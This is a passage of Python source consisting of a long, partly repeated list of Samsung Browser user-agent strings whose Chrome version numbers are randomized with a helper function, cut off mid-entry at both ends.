SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A307G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F926U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G996N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A102W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S906U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J737T1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-T550) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 2107113SG) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-F916U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908U1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A225M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S326DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A326U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G525F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; 